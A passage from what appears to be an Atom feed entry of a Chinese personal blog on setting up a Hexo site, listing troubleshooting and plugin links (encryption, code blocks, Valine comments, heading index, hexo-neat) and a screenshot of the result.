[message]</span><br></pre></td></tr></table></figure><p>参考：<a href="https://hexo.io/zh-cn/docs/one-command-deployment.html">https://hexo.io/zh-cn/docs/one-command-deployment.html</a></p><h1 id="一些问题"><a class="markdownIt-Anchor" href="#一些问题"></a> 一些问题</h1><h2 id="spawn-failed"><a class="markdownIt-Anchor" href="#spawn-failed"></a> Spawn failed</h2><p><a href="https://blog.csdn.net/Kevin_Carpricron/article/details/124069885">https://blog.csdn.net/Kevin_Carpricron/article/details/124069885</a></p><h1 id="组件推荐"><a class="markdownIt-Anchor" href="#组件推荐"></a> 组件推荐</h1><h2 id="文章加密"><a class="markdownIt-Anchor" href="#文章加密"></a> 文章加密</h2><p><a href="https://blog.51cto.com/u_15719567/5476056">https://blog.51cto.com/u_15719567/5476056</a></p><h2 id="代码块魔改"><a class="markdownIt-Anchor" href="#代码块魔改"></a> 代码块魔改</h2><p><a href="http://blog.iwwee.com/posts/hexo-optimize.html">http://blog.iwwee.com/posts/hexo-optimize.html</a></p><p>关于复制代码的那一块参考下面的：</p><p><a href="https://kangaroohy.com/tools/hexo-theme-pure-optimize.html">https://kangaroohy.com/tools/hexo-theme-pure-optimize.html</a></p><h2 id="评论系统开启"><a class="markdownIt-Anchor" href="#评论系统开启"></a> 评论系统开启</h2><p><a href="https://valine.js.org/quickstart.html">https://valine.js.org/quickstart.html</a></p><h2 id="markdown标题头"><a class="markdownIt-Anchor" href="#markdown标题头"></a> Markdown标题头</h2><p><a href="https://www.npmjs.com/package/hexo-heading-index">https://www.npmjs.com/package/hexo-heading-index</a></p><h2 id="博客优化"><a class="markdownIt-Anchor" href="#博客优化"></a> 博客优化</h2><p><code>npm install hexo-neat --save</code></p><p><a href="https://github.com/cofess/hexo-theme-pure/blob/master/README.cn.md">https://github.com/cofess/hexo-theme-pure/blob/master/README.cn.md</a></p><h1 id="效果"><a class="markdownIt-Anchor" href="#效果"></a> 效果</h1><p><img src="/images/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/image-20230523145936355.png" alt="image-20230523145936355" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;安装hexo和相关插件&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#安装hexo和相关插件&quot;&gt;&lt;/a&gt; 安装HEXO和相关插件&lt;/h1&gt;
&lt;h2 id=&quot;hexo的安装&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hr</summary>
      
    
    
    
    <category term="杂" scheme="https://j3f5.github.io/categories/%E6%9D%82/"/>
    
    
    <category term="博客搭建" scheme="https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
